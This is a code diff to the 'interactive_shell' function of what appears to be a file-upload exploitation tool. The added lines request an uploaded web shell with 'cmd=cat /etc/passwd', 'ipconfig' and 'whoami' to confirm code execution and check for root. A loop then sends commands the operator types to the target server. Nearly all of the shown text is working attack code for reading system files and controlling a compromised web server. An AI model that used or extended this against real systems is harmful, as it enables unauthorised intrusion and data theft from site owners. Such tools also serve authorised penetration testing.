@@ -20,16 +20,41 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
         is_magic_bytes = base64.b64encode(is_magic_bytes).decode('latin-1')
 
     if options.upload_dir != 'optional' and options.exploitation and not skip_module:
+        parameter_exists = False
+        if options.upload_dir.endswith("=/"):
+            options.upload_dir = options.upload_dir[:-1]
+            parameter_exists = True
 
         results(options.url, file_name, content_type, upload_dir, is_magic_bytes, options.output_dir, allowed_extension,
         current_time)
 
-        alerts.warning("Interactive Web-Shell is activated, you can enter system commands: ")
-        # Loop to run user commands on the target machine
+        filename = file_name.decode("ascii")
+        partial_url = urljoin(options.url, options.upload_dir)
+
+        if parameter_exists:
+            final_url = f"{partial_url}{filename}&cmd=cat /etc/passwd"
+        else:
+            final_url = f"{partial_url}{filename}?cmd=cat /etc/passwd" 
+
+        response, final_url = file_upload.send_get_request(headers, options, final_url)
+        # Display # if the shell is accessed with the root user
+        if 'root' in response.text:
+            alerts.warning("Interactive shell is activated, you can enter system commands: ")
+        
+        # Display $ if the shell isn't accessed with the root user
+        if 'root' not in response.text:
+            final_url = f"{partial_url}{filename}?cmd=ipconfig"
+            response, final_url = file_upload.send_get_request(headers, options, final_url)
+            if 'Default Gateway' in response.text:
+                alerts.warning("Interactive shell is activated, you can enter system commands: ")
+            else:
+                return
+        
         if not options.bruteForce:
             file_upload.printing(options, user_options, response, file_name.decode('latin-1'), 100, current_time,
                                  options.current_module, is_magic_bytes, options.current_mimetype)
-
+            
+        # Loop to run user commands on the target machine
         while True:
             try:
                 if options.bruteForce:
@@ -37,9 +62,14 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                 else:
                     alerts.warning("To exit interactive shell type exit or press CTRL + C")
                 filename = file_name.decode("ascii")
-                partial_url = urljoin(options.url, options.upload_dir)
-                final_url = f"{partial_url}{filename}?cmd=whoami"
+                partial_url = urljoin(options.url, upload_dir)
+                if parameter_exists:
+                    final_url = f"{partial_url}{filename}&cmd=whoami"
+                else:
+                    final_url = f"{partial_url}{filename}?cmd=whoami" 
+                
                 response, final_url = file_upload.send_get_request(headers, options, final_url)
+                
                 # Display # if the shell is accessed with the root user
                 if 'root' in response.text:
                     command = input(f"\n{green}└─# {reset}")  # User input command to execute on the target machine
@@ -82,7 +112,28 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                     alerts.error("Keyboard interrupt exception is caught!")
                 else:
                     break
+
     else:
+        if options.upload_dir != 'optional' and not skip_module:
+            parameter_exists = False
+            
+            if options.upload_dir.endswith("=/"):
+                options.upload_dir = options.upload_dir[:-1]
+                parameter_exists = True
+                
+            filename = file_name.decode("ascii")
+            partial_url = urljoin(options.url, options.upload_dir)
+            final_url = f"{partial_url}{filename}"
+
+            response, final_url = file_upload.send_get_request(headers, options, final_url)
+            file_data = open(f"assets/samples/sample.{options.file_extension}", 'r', encoding="latin-1")
+            file_data = file_data.read()
+
+            if "Is this message being rendered?" in response.text and file_data not in response.text:
+                pass
+            else:
+                return        
+
         if isinstance(file_name, bytes):
             file_name = file_name.decode('latin-1')
 
